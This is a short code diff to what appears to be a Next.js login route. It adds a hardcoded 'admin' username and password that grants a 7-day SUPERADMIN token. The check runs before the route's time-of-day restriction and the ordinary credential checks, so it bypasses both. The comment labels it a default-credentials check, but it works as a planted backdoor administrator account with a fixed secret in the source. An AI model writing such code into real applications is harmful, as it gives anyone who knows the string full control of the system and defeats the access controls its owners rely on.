@@ -46,6 +46,31 @@ export async function POST(request) {
       );
     }
 
+    // --- Superadmin default credentials check ---
+    if (
+      username.trim().toLowerCase() === "admin" &&
+      password.trim() === "Admgnfttrfvy@te"
+    ) {
+      const token = jwt.sign(
+        { id: 0, username: "admin", role: "SUPERADMIN" },
+        JWT_SECRET,
+        { expiresIn: "7d" },
+      );
+      const res = NextResponse.json({
+        message: "Login successful",
+        role: "SUPERADMIN",
+      });
+      res.cookies.set("token", token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === "production",
+        sameSite: "strict",
+        path: "/",
+        maxAge: 7 * 24 * 60 * 60,
+      });
+      await recordActivity("admin", "SUPERADMIN", "SUCCESS", `Superadmin default login from IP: ${ip}`);
+      return res;
+    }
+
     // --- 1. Time-based Restriction (9:00 AM - 7:00 PM IST) ---
     const { hour, minute } = getCurrentISTTime();
     const currentTimeMinutes = hour * 60 + minute;
